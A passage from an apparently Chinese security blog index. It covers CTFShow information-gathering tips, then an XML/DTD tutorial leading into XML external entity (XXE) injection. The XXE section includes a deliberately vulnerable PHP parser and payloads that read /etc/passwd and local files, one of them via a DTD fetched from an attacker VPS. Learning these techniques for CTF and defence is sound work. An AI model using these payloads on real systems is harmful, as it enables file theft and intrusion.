忘记密码 密保答案 西安 成功重置密码 成功登录 拿到 flag 1.16 Web 16 — 探针信息1对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露 PHP 探针 ​ php探针 是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡流量、系统负载、服务器时间等信息。 常用4款PHP探针 应该是雅黑探针，访问 /tz.php 查找 ctfshow 即可 1.17 Web 17 — 绕过 CDN 查 IP1透过重重缓存，查找到ctfer.com的真实IP，提交 flag&#123;IP地址&#125; 全球 ping 可知：无 CDN 查 www.ctfshow.com 的 IP，即为 ctfer.com的真实IP 1.18 Web 18 — 前端 js 泄露1不要着急，休息，休息一会儿，玩101分给你flag 查看源码，发现 Flappy_js.j unicode 解码 访问 110.php 1.19 Web 19 — 前端密钥泄露1密钥什么的，就不要放在前端了 查看源码得到 会有函数对我们提交的内容进行加密处理，处理后结果如果是下面绿色部分就显示flag，我们完全可以抓包直接将其修改为正确的样子 1.20 Web 20 — 早期 asp+access /db/db.mdb 文件泄露1mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。 1.21 Web 382 —首先查看源代码 可以一一进行尝试，最后发现 http://url/alsckdfy/ 竟然是网站的后台登录页面 爆破 弱密码 sql 万能密码 成功登录之后即可获得 flag 二、做题总结 第一步：查看 源代码 右键查看源代码 F12 打开开发者工具 Ctrl + U 查看源代码 Burp 抓包查看 抓包 可能发现一些有用信息 robots.txt phps 源代码泄露 下载源码文件、网站备份文件 版本控制不要部署到生产环境中 .git .svn Vim 缓存 .文件名.php.swp .文件名.php.swo .文件名.php.swn cookie 的重要性 域名、子域名 信息搜集 nslookup 在线网站 Banner 等公开信息 管理员密码 QQ QQ邮箱等 第三方软件查个人信息 技术文档 对应编辑器漏洞 探针 前端源码 密钥泄露 db.mdb","categories":[{"name":"CTF-Show","slug":"CTF-Show","permalink":"https://xizhi-future.github.io/categories/CTF-Show/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/tags/CTF/"},{"name":"信息搜集","slug":"信息搜集","permalink":"https://xizhi-future.github.io/tags/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"}],"author":"xizhi-future"},{"title":"XML与XXE","slug":"XML与XXE","date":"2021-10-01T09:16:32.000Z","updated":"2021-10-01T09:21:35.693Z","comments":true,"path":"2021/10/01/XML与XXE/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/XML%E4%B8%8EXXE/","excerpt":"一、XML1.1 简介XML是一种用于标记电子文件使其具有结构性的 可扩展标记语言（EXtensible Markup Language）。 XML的前身是 标准通用标记语言 ，为了使标准通用标记语言显得用户友好，XML重新定义了标准通用标记语言的一些内部值和参数，去掉了大量的很少用到的功能，这些繁杂的功能使得标准通用标记语言在设计网站时显得复杂化。XML保留了标准通用标记语言的结构化功能，这样就使得网站设计者可以定义自己的文档类型，XML同时也推出一种新型文档类型，使得开发者也可以不必定义文档类型。","text":"一、XML1.1 简介XML是一种用于标记电子文件使其具有结构性的 可扩展标记语言（EXtensible Markup Language）。 XML的前身是 标准通用标记语言 ，为了使标准通用标记语言显得用户友好，XML重新定义了标准通用标记语言的一些内部值和参数，去掉了大量的很少用到的功能，这些繁杂的功能使得标准通用标记语言在设计网站时显得复杂化。XML保留了标准通用标记语言的结构化功能，这样就使得网站设计者可以定义自己的文档类型，XML同时也推出一种新型文档类型，使得开发者也可以不必定义文档类型。 特征，与 HTML 的区别： XML 被设计用来 被设计用来结构化、存储以及传输信息，焦点是数据的内容。 HTML 被设计用来 显示数据，焦点是数据的外观。 HTML 旨在 显示信息，而 XML 旨在 传输信息 XML 的设计宗旨是传输数据，而不是显示数据 XML 被设计为具有 自我描述性 XML 标签没有被预定义。您需要自行定义标签（即允许创作者定义自己的标签和自己的文档结构） HTML 文档只能使用在 HTML 标准中定义过的标签（如 &lt;p&gt;、&lt;h1&gt; 等等） XML标签必须闭合，允许 &lt;外观 /&gt;,不允许 &lt;外观&gt;，只可是 &lt;外观&gt;&lt;/外观&gt; HTML可不闭合 ，可 &lt;p&gt;,&lt;p&gt;&lt;/p&gt;,&lt;img /&gt; XML标签的 结构和样式分离 HTML标签的 结构和样式结合在一起 &lt;h1&gt;标签 是W3C的推荐标准 注：本来发明XML是为了替换掉HTML标签的，最后由于各种原因，未能成功替换掉，于是解决办法是发明了一个新的 XHTML，该语言内部的技术使用的是XML的，而标签都是HTML的 作用： 当作小型的数据库使用 msg聊天工作通过xml文件在本地保留聊天记录 许多软件的 配置文件 都是通过xmk来保存的 许多媒体工资通过xml文件保留用户之前看到的媒体信息 在网站当中当作 “接口” 服务 XML文件作为配置文件（Spring、Struts2等）、文档结构说明文件（PDF、RSS等）、图片格式文件（SVG header）应用比较广泛。 例子： 123456789101112131415#XML文档&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [&lt;!ELEMENT message (hair,country,eye,body)&gt;&lt;!ELEMENT hair (#PCDATA)&gt;&lt;!ELEMENT country (#PCDATA)&gt;&lt;!ELEMENT eye (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt; ]&gt;&lt;message&gt; &lt;hair&gt;Black&lt;/hair&gt; &lt;country&gt;China&lt;/country&gt; &lt;eye&gt;big&lt;/eye&gt; &lt;body&gt;You are handsome!&lt;/body&gt;&lt;/message&gt; 充分体现了 具有自我描述性，但是这个 XML 文档仍然没有做任何事情。它仅仅是包装在 XML 标签中的纯粹的信息。我们需要编写软件或者程序，才能传送、接收和显示出这个文档。 1.2 用途 XML 把数据从 HTML 分离，是独立于软件和硬件的信息传输工具 简化数据共享 简化数据传输 简化平台变更，其实也是简化数据的传输与共享 1.3 规则12345671.XML文档必须有一个（唯一） 根元素 ，该元素是其他元素的 父元素2.XML每个元素都必须有开始和结束标签，即成对出现3.XML标签对大小写敏感，开始与闭合标签大小写类型需要一致4.XML元素需要正确嵌套，即不可交叉嵌套 #&lt;abc&gt;&lt;test&gt;&lt;/abc&gt;&lt;/test&gt; 错误5.XML属性 必须有 值，且必须加引号6.特殊字符需要 实体引用7.注释：&lt;!-- --&gt; 12345标签的组成部分：1.字母，数字，下划线2.不能以 数字和标点符号 开始3.不能包含 空格4.最好避免使用 - , . , : 等 实体引用 &amp;lt; &lt; &amp;gt; &gt; &amp;amp; &amp; &amp;apos; ‘ &amp;quot; “ 其实在 XML 中，只有字符 “&lt;” 和 “&amp;” 确实是非法的。大于号是合法的，但是用实体引用来代替它是一个好习惯。 1.4 PCDATA被解析的字符，文本 不能含有 特殊字符 1.5 CDATA不会被解析的字符，文本 当需要显示的特殊符号偏多，但又不想使用实体的引用时，可使用 CDATA，它指的是不应该由 XML解释器进行解析的文本数据。 123#使用&lt;![CDATA[文本数据]]&gt;#例子：&lt;eye&gt;&lt;![CDATA[&lt;sdsdj&gt;&gt;&gt;&amp;&amp;dfd&#x27;f&quot;]]&gt;big&lt;/eye&gt; 1.6 XML 属性 与 元素属性： 1234&lt;note day=&quot;10&quot; month=&quot;01&quot; year=&quot;2008&quot;to=&quot;Tove&quot; from=&quot;Jani&quot; heading=&quot;Reminder&quot;body=&quot;Don&#x27;t forget me this weekend!&quot;&gt;&lt;/note&gt; 12345#缺点：属性不能包含多个值不能包含树结构不容易扩展难以阅读 元素： 1234567891011&lt;note&gt; &lt;date&gt; &lt;day&gt;10&lt;/day&gt; &lt;month&gt;01&lt;/month&gt; &lt;year&gt;2008&lt;/year&gt; &lt;/date&gt; &lt;to&gt;Tove&lt;/to&gt; &lt;from&gt;Jani&lt;/from&gt; &lt;heading&gt;Reminder&lt;/heading&gt; &lt;body&gt;Don&#x27;t forget me this weekend!&lt;body&gt;&lt;/note&gt; 建议：使用元素 特别的：ID属性，便于访问XML元素 1234567891011121314&lt;messages&gt;&lt;note id=&quot;p501&quot;&gt; &lt;to&gt;Tove&lt;/to&gt; &lt;from&gt;Jani&lt;/from&gt; &lt;heading&gt;Reminder&lt;/heading&gt; &lt;body&gt;Don&#x27;t forget me this weekend!&lt;/body&gt;&lt;/note&gt;&lt;note id=&quot;p502&quot;&gt; &lt;to&gt;Jani&lt;/to&gt; &lt;from&gt;Tove&lt;/from&gt; &lt;heading&gt;Re: Reminder&lt;/heading&gt; &lt;body&gt;I will not!&lt;/body&gt;&lt;/note&gt;&lt;/messages&gt; 1.7 XML在浏览器中的显示显示：单独的 XML 文档不会携带有关如何显示数据的信息，直接将XML的源码显示出来。 方法： 链接到CSS文件 1&lt;?xml-stylesheet type=&quot;text/css&quot; href=&quot;cd_catalog.css&quot;?&gt; 使用 CSS 格式化 XML 不是常用的方法 使用 XSLT，把 XML 文档转换成 HTML 格式显示 XSLT 是首选的 XML 样式表语言，当浏览器读取 XML 文件时，XSLT 转换是由浏览器完成的 使用 XSLT 来转换 XML 时，不同的浏览器可能会产生不同结果。为了减少这种问题，可以在服务器上进行 XSLT 转换。 1.8 XML 的解析所有现代浏览器都有内建的 XML 解析器。 XML 解析器把 XML 文档转换为 XML DOM 对象 - 可通过 JavaScript 操作的对象。 XML DOM : XML DOM（XML Document Object Model）定义了访问和操作 XML 文档的标准方法，把 XML 文档作为树结构来查看。 通过 DOM 树可以 访问 和 修改或删除 它们的内容，并 创建新的元素。 有两种基本的 XML 解析器类型： 基于树的解析器：这种解析器把 XML 文档转换为树型结构。它分析整篇文档，并提供了对树中元素的访问，例如文档对象模型 (DOM)。 基于事件的解析器：将 XML 文档视为一系列的事件。当某个具体的事件发生时，解析器会调用函数来处理。 DOM 解析器是基于树的解析器。 1.8.1 PHP XML DOM内建的 DOM 解析器使在 PHP 中处理 XML 文档成为可能。 也就是说DOM XML 解析器函数是 PHP 核心的组成部分。无需安装就可以使用这些函数。 示例： 1#xml：&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [&lt;!ELEMENT message (hair,country,eye,body)&gt;&lt;!ELEMENT hair (#PCDATA)&gt;&lt;!ELEMENT country (#PCDATA)&gt;&lt;!ELEMENT eye (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt; ]&gt;&lt;message&gt; &lt;hair&gt;Black&lt;/hair&gt; &lt;country&gt;China&lt;/country&gt; &lt;eye&gt;big&lt;/eye&gt; &lt;body&gt;You are handsome!&lt;/body&gt;&lt;/message&gt; 1#php:直接输出&lt;?php$xmlDoc = new DOMDocument();#创建DOMDocument对象$xmlDoc-&gt;load(&quot;test.xml&quot;);#将test.xml加载进去print $xmlDoc-&gt;saveXML();#把内部 XML 文档放入一个字符串，用于输出?&gt; 1#php:遍历 XML&lt;?php$xmlDoc = new DOMDocument();$xmlDoc-&gt;load(&quot;test.xml&quot;);$x = $xmlDoc-&gt;documentElement;foreach ($x-&gt;childNodes AS $item)&#123; print $item-&gt;nodeName . &quot; = &quot; . $item-&gt;nodeValue . &quot;&lt;br&gt;&quot;;&#125;?&gt; 1#php:SimpleXML&lt;?php$xml=simplexml_load_file(&quot;test.xml&quot;);print_r($xml);?&gt; 1&lt;?php$xml=simplexml_load_file(&quot;test.xml&quot;);echo $xml-&gt;hair . &quot;&lt;br&gt;&quot;;echo $xml-&gt;country . &quot;&lt;br&gt;&quot;;echo $xml-&gt;eye . &quot;&lt;br&gt;&quot;;echo $xml-&gt;body;?&gt; 1&lt;?php$xml=simplexml_load_file(&quot;test.xml&quot;);echo $xml-&gt;getName() . &quot;&lt;br&gt;&quot;; foreach($xml-&gt;children() as $child)&#123; echo $child-&gt;getName() . &quot;: &quot; . $child . &quot;&lt;br&gt;&quot;;&#125;?&gt; XML DOM 教程 1.9 文档结构 — 树结构 XML声明 DTD文档类型定义（可选） 文档元素 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;note&gt; #根元素，与其它元素之间是 父子关系;各个子元素之间：同胞关系&lt;to&gt;Tove&lt;/to&gt;#四个子元素：to,from,heading,body&lt;from&gt;Jani&lt;/from&gt;&lt;heading&gt;Reminder&lt;/heading&gt;&lt;body&gt;Don&#x27;t forget me this weekend!&lt;/body&gt;&lt;/note&gt; 1.9.1 XML声明1&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;#XML声明: 用于告诉浏览器这是一个xml文档；当看到该声明时，浏览器会自动调用 xml解释器 运行该xml文档#version属性：用于说明当前xml文档的版本，属性必须#encodeing属性：用于说明当前xml文档使用的字符编码集，xml解析器会使用这个编码来解析xml文档，属性可选 1.9.2 DTD文档类型定义（可选）DTD(Document Type Definition) 即 文档类型定义，作用是定义 XML 文档的合法构建模块，这个模块里面 定义了用户自己创建的根元素以及对应的子元素和根元素的合法子元素和属性，那么文档中的所有元素都必须以该DTD为模板, 用于对XML的元素的内容进行相应的规范化。 作用：验证你的XML 格式：定义元素 1&lt;!DOCTYPE note [&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!ELEMENT heading (#PCDATA)&gt;&lt;!ELEMENT body (#PCDATA)&gt;]&gt; 注：W3C 支持一种基于 XML 的 DTD 代替者，它名为 XML Schema XML Schema 菜鸟教程 使用 XML Schema 攻击 定义实体： 除了在 DTD 中定义 元素（其实就是对应 XML 中的标签）以外，我们还能在 DTD 中 定义实体 (对应XML 标签中的内容) 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe &quot;test&quot;&gt;]&gt;&lt;creds&gt; &lt;user&gt;&amp;xxe;&lt;/user&gt; &lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt; 实体可以从 外部的 dtd 文件 中引用 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;]&gt;&lt;creds&gt; &lt;user&gt;&amp;xxe;&lt;/user&gt; &lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;dtd:&lt;!ENTITY xxe SYSTEM &quot;file:///d://test1.txt&quot;&gt; 声明方式 内部声明 1&lt;!DOCTYPE 根元素 [元素声明]&gt;#例如&lt;!DOCTYPE message [&lt;!ELEMENT message (hair,country,eye,body)&gt;&lt;!ELEMENT hair (#PCDATA)&gt;&lt;!ELEMENT country (#PCDATA)&gt;&lt;!ELEMENT eye (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt; ]&gt; 外部声明 1&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt; 1#例如：&lt;!DOCTYPE message SYSTEM &quot;message.dtd&quot;&gt;#message.dtd&lt;!ELEMENT message (hair,country,eye,body)&gt;&lt;!ELEMENT hair (#PCDATA)&gt;&lt;!ELEMENT country (#PCDATA)&gt;&lt;!ELEMENT eye (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt; 二、DTD2.1 元素声明 普通声明 1&lt;!ELEMENT element-name category&gt;或&lt;!ELEMENT element-name (element-content)&gt; 空元素 1&lt;!ELEMENT element-name EMPTY&gt;实例:&lt;!ELEMENT br EMPTY&gt;XML example:&lt;br /&gt; PCDATA元素 1&lt;!ELEMENT element-name (#PCDATA)&gt; 带有任何内容的元素 1&lt;!ELEMENT element-name ANY&gt; 带有子元素的声明 1&lt;!ELEMENT element-name (child1)&gt;&lt;!ELEMENT element-name (child1,child2,...)&gt; 1例子：要按顺序&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!ELEMENT heading (#PCDATA)&gt;&lt;!ELEMENT body (#PCDATA)&gt; 只出现一次的元素 1&lt;!ELEMENT element-name (child-name)&gt; 最少出现一次的元素 1&lt;!ELEMENT element-name (child-name+)&gt; 出现零次或多次 1&lt;!ELEMENT element-name (child-name*)&gt; 出现零次或一次 1&lt;!ELEMENT element-name (child-name?)&gt; 其它 1&lt;!ELEMENT note (to,from,header,(message|body))&gt; &lt;!ELEMENT note (#PCDATA|to|from|header|message)*&gt; 2.2 属性声明1&lt;!ATTLIST element-name attribute-name attribute-type attribute-value&gt; 属性类型 2.3 实体前面了解到DTD是用来定义XML文档当中的元素的，用于规范他们，实际上，它还 用于定义引用普通文本或特殊字符的快捷方式的变量（即 实体）。 实体其实可以看成一个变量，到时候我们可以在 XML 中通过 &amp; 符号进行引用。 2.3.1 普通实体 内部声明 1&lt;!ENTITY entity-name &quot;entity-value&quot;&gt; 1#实体的引用：&amp;，实体名称，分号 1例子：&lt;!ENTITY day &quot;10&quot;&gt; XML:&lt;day&gt;&amp;day;&lt;/day&gt; 外部声明 1&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;&lt;!ENTITY 实体名称 PUBLIC &quot;DTD标识名&quot; &quot;公用DTD的URI&quot;区别: PUBLIC是指公用DTD,其是某个权威机构制定，供特定行业或公司. SYSTEM是指该外部DTD文件是私有的，即我们自己创建的，没有公开发行，只是个人或在公司内部或者几个合作单位之间使用. 公用DTD使用PUBLIC代替了原来的SYSTEM，并增加了DTD标识名。 1例子：test1.dtd:&lt;!ENTITY test SYSTEM &quot;file:///d://test1.txt&quot;&gt;XML：&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE test SYSTEM &quot;file:///d://test1.dtd&quot;&gt;&lt;author&gt;&amp;test;&lt;/author&gt; 2.3.2 参数实体仅仅在DTD中使用的解析实体 1#内部声明: ENTITY关键字、百分号、名称和替换值&lt;!ENTITY % 实体名称 &quot;实体值&quot;&gt;#外部声明&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;%实体名;#实体的引用&lt;x&gt;%实体名;&lt;/x&gt; 注： %两边的空格不能少 参数实体不能像普通实体那样在xml文档内容中进行引用，它的引用范围只在 当前xml文件的DTD声明 中，或者是 当前的DTD文件 中 在DTD中，所有参数实体必须在引用之前进行声明 参数实体对 无回显XXE 的利用 起了至关重要的作用 XML Schema 菜鸟教程 三、XXE**XML External Entity — XML外部实体注入漏洞 ** , 发生在 应用程序解析XML输入时，没有禁止外部实体的加载 （ 与该选项有关libxml_disable_entity_loader (false);），导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击 等危害。 概述：攻击者通过 向服务器注入指定的xml实体内容 ，从而让服务器按照指定的配置进行执行,导致问题。也就是说服务端 接收和解析 了来自用户端的xml数据,而又没有做严格的安全控制,从而导致 xml外部实体注入。 产生点： 文档类型定义时，可以引用外部的 DTD 文件 XML解析器解析外部实体时支持多种协议（file :///, http:// 等） 利用点： ​ 通过构造恶意的外部实体，当XML解析器解析了我们所包含的恶意实体时便会触发漏洞 1现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的,从而也就直接避免了这个漏洞。#以PHP为例,在PHP里面解析xml用的是libxml，其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。 危害 文件读取 RCE执行 内网攻击 Dos攻击 3.1 利用3.1.1 有回显通过正常的回显将 外部实体 中的内容读取出来 测试：1&lt;?php libxml_disable_entity_loader (false);//禁用加载外部实体的功能，禁用（TRUE）或启用（FALSE）libxml扩展（如DOM，XMLWriter和XMLReader）来加载外部实体 $xmlfile = file_get_contents(&#x27;php://input&#x27;); $dom = new DOMDocument();//创建一个DOM对象 $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); //加载XML//LIBXML_NOENT 替代实体//LIBXML_DTDLOAD 加载外部子集 $creds = simplexml_import_dom($dom);//该函数把 DOM 节点转换为 SimpleXMLElement 对象 echo $creds;?&gt; 引入内部实体 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [ &lt;!ENTITY test SYSTEM &quot;file:///c:/windows/system32/drivers/etc/hosts&quot;&gt; ]&gt; &lt;creds&gt;&amp;test;&lt;/creds&gt; 引入外部参数实体 —– 题目当中经常使用的一个点 1&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY % file SYSTEM &quot;http://vps-ip/hack.dtd&quot;&gt; %file;]&gt;&lt;test&gt;&amp;hhh;&lt;/test&gt; 1hack.dtd&lt;!ENTITY hhh SYSTEM &#x27;file:///etc/passwd&#x27;&gt; 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [ &lt;!ENTITY test SYSTEM &quot;file:///d://222.txt&quot;&gt; ]&gt; &lt;creds&gt;&amp;test;&lt;/creds&gt; 当文件内容当中包含 &lt; 和 &amp; 符号时，就会出现报错 php://filter之前最常出镜的地方是XXE。由于XXE漏洞的特殊性，我们在读取HTML、PHP等文件时可能会抛出此类错误parser error : StartTag: invalid element name 。其原因是，PHP是基于标签的脚本语言，&lt;?php ... ?&gt;这个语法也与XML相符合，所以在解析XML的时候会被误认为是XML，而其中内容（比如特殊字符）又有可能和标准XML冲突，所以导致了出错。 解决：使用 CDATA 想法一： 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [ &lt;!ENTITY test SYSTEM &quot;file:///d:/222.txt&quot;&gt; ]&gt; &lt;creds&gt;&lt;![CDATA[&amp;test;]]&gt;&lt;/creds&gt;#错误：这只会将 &amp;test; 原模原样的输出 想法二：直接在 xml当中进行拼接 —- 普通实体 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [ &lt;!ENTITY start &quot;&lt;![CDATA[&quot;&gt;&lt;!ENTITY test SYSTEM &quot;file:///d:/222.txt&quot;&gt; &lt;!ENTITY end &quot;]]&gt;&quot;&gt;]&gt; &lt;creds&gt;&amp;start;&amp;test;&amp;end;&lt;/creds&gt;#依旧是大量的报错 想法三：参数实体 在 内部DTD拼接 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [ &lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;&lt;!ENTITY % test SYSTEM &quot;file:///d:/222.txt&quot;&gt; &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;&lt;!ENTITY all &quot;%start;%test;%end;&quot;&gt;]&gt; &lt;creds&gt;&amp;all;&lt;/creds&gt;#仍旧有报错 根据XML规范所描述：“在DTD内部子集中的参数实体调用，不能混掺到标记语中” ; 也就是说参数实体不能在内部DTD中进行拼接，但是XML规范还声明了一点：“外部参数实体不受此限制”，这就告诉我们可以使用外部的DTD来构造payload，将我们的CDATA内容拼接起来. 想法四：使用外部参数实体 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [ &lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;&lt;!ENTITY % test SYSTEM &quot;file:///d:/222.txt&quot;&gt; &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;&lt;